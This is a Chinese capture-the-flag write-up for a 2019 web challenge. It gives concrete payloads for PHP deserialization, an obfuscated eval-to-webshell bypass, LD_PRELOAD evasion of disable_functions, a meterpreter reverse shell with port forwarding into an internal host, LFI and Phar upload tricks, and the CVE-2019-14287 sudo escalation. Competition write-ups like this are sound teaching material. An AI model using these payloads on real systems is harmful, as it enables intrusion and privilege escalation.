# CNSS Recruit 2019 Web Boss题 WriteUp


## 0x00 ~~吐槽~~思考 for [BOSS] Get Me Inside
这道题肝的是真的爽，从 ddl 前一天晚上开始，搞到 ddl 当天凌晨四点多~~（原来我的肝这么好）~~
这是一道涉及面广泛的题，考虑到了实战的一些情况，考察多方面的知识，是一道不可多得的好题（即使如此，我依旧想暴打各位出题人emmm）

## 0x01 反序列化漏洞
打开这道题首先就是一堆 PHP 源码，直接就摆上了一大堆 `class` ，先暂时略过这些 `class` ，继续向下看，我们会发现在源码的末尾有这么一段
```php
<?php
$a = $_GET['p'];
unserialize($a);
if($flag === 1){
    ...
}
?>
```
结合上边的一大堆 `class` ，考虑利用反序列化漏洞，层层递进，最终将变量 `flag` 的值设为 `1` 即可，故构造以下 payload （这里可以直接复制粘贴，然后自己写一个脚本把需要的变量序列化一下即可）
```url
/?p=O:4:"Deep":2:{s:2:"m1";O:4:"Dark":2:{s:2:"m1";O:7:"Fantasy":2:{s:2:"m1";O:5:"Happy":2:{s:2:"m1";O:8:"New_year":2:{s:2:"s1";O:21:"Copied_from_somewhere":0:{}s:2:"s2";N;}s:2:"m2";N;}s:2:"m2";N;}s:2:"m2";N;}s:2:"m2";N;}
```
输入后发现在未提供参数 `c` 的情况下输出了 `?` ，可知成功将 `flag` 设为 `1` 

## 0x02 get shell
之后查看最后的一段源码
```php
<?php
if(!isset($_GET['c'])){
    die("?");
}
$code = $_GET['c'];
 if(strlen($code)>37){
    die("这么长会死的!");
}
if(preg_match("/[A-Za-z0-9^!]+/",$code)){
    die("Catch you!");
}
@eval($code);
?>
```
考虑通过 `eval` 这个函数调用其他函数拿到系统 shell ，然而首先要面对的问题就是这个可恶的正则，你注入的代码中不能包含任何字母、数字和 `^` ` !` 两种符号
这里可以使用 PHP 的另一种函数调用方式 `(函数名)(参数)` ，然后函数名和参数都采用按位取反的方式，通过url编码和 `~` 运算符调用函数
然后我们非常高兴的执行了 `system('whoami')` ，但是，什么都没有发生，看一下 `phpinfo()` ，发现几乎所有能拿到系统shell的函数都在 `disable_functions` 里，然后考虑绕过 `disable_functions` 的方法，经过多方查找，最后选择了通过 `LD_PRELOAD` 的方式绕过，但这种方法需要上传文件，所以继续构造 payload
```url
/?p=O:4:%22Deep%22:2:{s:2:%22m1%22;O:4:%22Dark%22:2:{s:2:%22m1%22;O:7:%22Fantasy%22:2:{s:2:%22m1%22;O:5:%22Happy%22:2:{s:2:%22m1%22;O:8:%22New_year%22:2:{s:2:%22s1%22;O:21:%22Copied_from_somewhere%22:0:{}s:2:%22s2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}&c=(~%9e%8c%8c%9a%8d%8b)(${~%a0%b8%ba%ab}[%aa]);&%aa=eval($_POST['aaa']);
```
这里我们采用另一个可以执行 PHP 语句的函数 `assert` ，但由于 `assert` 一次只能执行一条语句，我们可以在其中再加入一个 `eval` ，这里便出现了我们熟悉的一句话木马，二话不说扔到蚁剑里，发现 shell 依然无法使用，但可以读取和上传文件（这里是因为读取和上传文件可以用 PHP 自带的其它函数实现，所以不需要拿到 shell 就可以），由于 hint 告诉我们对 `html` 目录没有写权限，故考虑另一个目录 `/tmp` ，测试后发现有写权限，故可以上传构造的 `so` 文件进行进一步操作（但当时服务器里有不知哪位好心的大哥留下的 `so` 文件，我就直接拿来用了，后来知道那个文件[出自此处](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)，这个构造的十分巧妙，使用了另一个环境变量，配合 PHP 实现一次编译即可执行任意命令，无需每次修改命令都要重新编译，学到了)，然后 `include` 一下配套的 PHP 文件，按照 PHP 里的参数配置一下，成功拿到系统shell

## 0x03 内网穿透
由于 hint 给出了 `LAN & ARP` ，这里考虑 flag 可能存在于另一台服务器（记为服务器2）上，用 `arp -a` 看一下，发现有这么一个 IP 与众不同
```
getmeinside_inner_1.getmeinside_lan (172.16.233.233) at 02:42:ac:10:e9:e9 [ether] on eth0
```
`curl` 看一下，发现有一个网页可以上传文件，考虑将服务器2的80端口转发出来，可以采用 msf 的 `meterpreter` 模块（这里需要自己有一个公网 IP ，我选择开了一个 VPS ，一般来说再将 VPS 端口转发到本地比较安全，但我为了方便直接在 VPS 上装了个 msf ，毕竟用完即删）
先用 `msfvenom` 做个木马，然后用蚁剑上传到服务器1，给一下执行权限，接下来在 `msfconsole` 中监听木马设置的端口，然后再服务器1中运行木马，拿到 `meterpreter shell`，然后用 `portfwd` 进行端口转发，打开转发到服务器上的端口，成功打开服务器2上的网页

## 0x04 get shell **Again**
打开页面，发现似乎可以上传什么东西，观察 url 有 `/?file=index` ，点击上传后 url 变化但页面并未变化，尝试去掉最后的 `.php` ，发现成功打开上传页面，可以判断 `file` 是一个 `include` 漏洞，尝试 `php伪协议` 读取源码，构造以下 payload
```url
/?file=php://filter/read=convert.base64-encode/resource=upload
```
成功读到 `upload.php` 的源码（我第一次做的时候的确读到了源码，但再次尝试却发现读不到了QAQ）
观察上传页面，发现并无表单可以提交，就在本地写一个表单提交到服务器2，尝试发现只能上传 png 文件，由于 hint 指出了 `Phar` ，于是写一个一句话木马，打包成 `zip`（注意打包时选择不压缩），然后将拓展名改为 `png` ，成功上传，得到上传后的文件名，构造以下 payload（注意最后的木马名不需要 `.php`)
```url
/?file=phar://pic/文件名/木马名
```
看一下 `phpinfo` ，发现拿 shell 的函数并没有被禁用，直接拿到系统shell（这里我想再扔到蚁剑里，但莫名其妙连不上，就手动操作了）

## 0x05 读取 flag 文件
根据 hint ，只有 root 用户可以读取 flag 文件，尝试 `sudo cat`，发现并不能读取，`sudo -l` 看一下权限，发现权限设置如下
```
(ALL,!root) NOPASSWD:/bin/cat
```
直接使用 `sudo` 无法使用 `cat` ，这里我探索了接近两小时终于搜到了一个神奇的漏洞 `CVE-2019-14287` ，漏洞具体信息可以参考我好不容易搜到的的[这个网站](https://www.agesec.com/8369.html)
根据这个漏洞执行以下命令
```bash
sudo -u#-1 /bin/cat /flag
```
成功获得 flag！！！（泪目）
